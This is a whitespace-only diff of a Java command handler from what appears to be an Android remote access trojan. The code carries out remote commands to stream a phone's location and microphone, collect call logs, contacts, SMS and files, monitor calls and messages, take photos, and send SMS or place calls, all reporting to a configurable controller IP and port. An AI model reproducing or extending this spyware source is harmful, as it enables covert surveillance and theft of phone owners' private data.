@@ -56,7 +56,7 @@ public class ProcessCommand
 		this.commande = cmd;
 		this.chan = chan;
 		this.arguments = ByteBuffer.wrap(args);
-		
+
 		if (commande == Protocol.GET_GPS_STREAM)
 		{
 			String provider = new String(arguments.array());
@@ -67,25 +67,25 @@ public class ProcessCommand
 			}
 			else
 				client.sendError("Unknown provider '"+provider+"' for location");
-			
+
 		} else if (commande == Protocol.STOP_GPS_STREAM)
 		{
 			client.gps.stop();
 			client.gps = null;
 			client.sendInformation("Location stopped");
-			
+
 		} else if (commande == Protocol.GET_SOUND_STREAM)
 		{
 			client.sendInformation("Audio streaming request received");
 			client.audioStreamer = new AudioStreamer(client, arguments.getInt(), chan);
 			client.audioStreamer.run();
-			
+
 		} else if (commande == Protocol.STOP_SOUND_STREAM)
 		{
 			client.audioStreamer.stop();
 			client.audioStreamer = null;
 			client.sendInformation("Audio streaming stopped");
-			
+
 		} else if (commande == Protocol.GET_CALL_LOGS)
 		{
 			client.sendInformation("Call log request received");
@@ -96,33 +96,33 @@ public class ProcessCommand
 		{
 			client.sendInformation("Start monitoring call");
 			client.callMonitor = new CallMonitor(client, chan, arguments.array());
-			
+
 		} else if (commande == Protocol.STOP_MONITOR_CALL)
 		{
 			client.callMonitor.stop();
 			client.callMonitor = null;
 			client.sendInformation("Call monitoring stopped");
-			
+
 		} else if (commande == Protocol.GET_CONTACTS)
 		{
 			client.sendInformation("Contacts request received");
 			if (!ContactsLister.listContacts(client, chan, arguments.array()))
 				client.sendError("No contact to return");
-			
+
 		} else if (commande == Protocol.LIST_DIR)
 		{
 			client.sendInformation("List directory request received");
 			String file = new String(arguments.array());
 			if (!DirLister.listDir(client, chan, file))
 				client.sendError("Directory: "+file+" not found");
-			
+
 		} else if (commande == Protocol.GET_FILE)
 		{
 			String file = new String(arguments.array());
 			client.sendInformation("Download file "+file+" request received");
 			client.fileDownloader = new FileDownloader(client);
 			client.fileDownloader.downloadFile(file, chan);
-			
+
 		} else if (commande == Protocol.GET_PICTURE)
 		{
 			client.sendInformation("Photo picture request received");
@@ -131,12 +131,12 @@ public class ProcessCommand
 			client.photoTaker = new PhotoTaker(client, chan);
 			if (!client.photoTaker.takePhoto())
 				client.sendError("Something went wrong while taking the picture");
-			
+
 		} else if (commande == Protocol.DO_TOAST)
 		{
 			client.toast = Toast.makeText(client, new String(arguments.array()), Toast.LENGTH_LONG);
 			client.toast.show();
-			
+
 		} else if (commande == Protocol.SEND_SMS)
 		{
 			Map<String, String> information = EncoderHelper.decodeHashMap(arguments.array());
@@ -157,18 +157,18 @@ public class ProcessCommand
 			 intent = new Intent(Intent.ACTION_CALL,Uri.parse(uri));
 			 intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			 client.startActivity(intent);
-			 
+
 		} else if (commande == Protocol.GET_SMS)
 		{
 			client.sendInformation("SMS list request received");
 			if(!SMSLister.listSMS(client, chan, arguments.array()))
 				client.sendError("No SMS match for filter");
-			
+
 		} else if (commande == Protocol.MONITOR_SMS)
 		{
 			client.sendInformation("Start SMS monitoring");
 			client.smsMonitor = new SMSMonitor(client, chan, arguments.array());
-			
+
 		} else if (commande == Protocol.STOP_MONITOR_SMS)
 		{
 			client.smsMonitor.stop();
@@ -178,7 +178,7 @@ public class ProcessCommand
 		else if (commande == Protocol.GET_PREFERENCE)
 		{
 			client.handleData(chan, loadPreferences().build());
-		} 
+		}
 		else if (commande == Protocol.SET_PREFERENCE)
 		{
 			client.sendInformation("Preferences received");
@@ -207,19 +207,19 @@ public class ProcessCommand
 		else {
 			client.sendError("Command: "+commande+" unknown");
 		}
-			
+
 	}
 
 	public PreferencePacket loadPreferences()
 	{
 		PreferencePacket p = new PreferencePacket();
-		
+
 		SharedPreferences settings = client.getSharedPreferences("preferences", 0);
 
 		p.setIp( settings.getString("ip", "192.168.0.12"));
 		p.setPort (settings.getInt("port", 9999));
 		p.setWaitTrigger(settings.getBoolean("waitTrigger", false));
-		
+
 		ArrayList<String> smsKeyWords = new ArrayList<String>();
 		String keywords = settings.getString("smsKeyWords", "");
 		if(keywords.equals(""))
@@ -232,7 +232,7 @@ public class ProcessCommand
 			}
 			p.setKeywordSMS(smsKeyWords);
 		}
-		
+
 		ArrayList<String> whiteListCall = new ArrayList<String>();
 		String listCall = settings.getString("numCall", "");
 		if(listCall.equals(""))
@@ -245,8 +245,8 @@ public class ProcessCommand
 			}
 			p.setPhoneNumberCall(whiteListCall);
 		}
-		
-		
+
+
 		ArrayList<String> whiteListSMS = new ArrayList<String>();
 		String listSMS = settings.getString("numSMS", "");
 		if(listSMS.equals(""))
@@ -266,18 +266,18 @@ public class ProcessCommand
 	{
 		PreferencePacket pp = new PreferencePacket();
 		pp.parse(data);
-		
+
 		SharedPreferences settings = client.getSharedPreferences("preferences", 0);
 
 		SharedPreferences.Editor editor = settings.edit();
 		editor.putString("ip", pp.getIp());
 		editor.putInt("port", pp.getPort());
 		editor.putBoolean("waitTrigger", pp.isWaitTrigger());
-		
+
 		String smsKeyWords = "";
 		String numsCall = "";
 		String numsSMS = "";
-		
+
 		ArrayList<String> smsKeyWord = pp.getKeywordSMS();
 		for (int i = 0; i < smsKeyWord.size(); i++)
 		{
@@ -287,7 +287,7 @@ public class ProcessCommand
 				smsKeyWords += smsKeyWord.get(i) + ";";
 		}
 		editor.putString("smsKeyWords", smsKeyWords);
-		
+
 		ArrayList<String> whiteListCall = pp.getPhoneNumberCall();
 		for (int i = 0; i < whiteListCall.size(); i++)
 		{
@@ -298,7 +298,7 @@ public class ProcessCommand
 		}
 		editor.putString("numCall", numsCall);
 
-		
+
 		ArrayList<String> whiteListSMS = pp.getPhoneNumberSMS();
 		for (int i = 0; i < whiteListSMS.size(); i++)
 		{
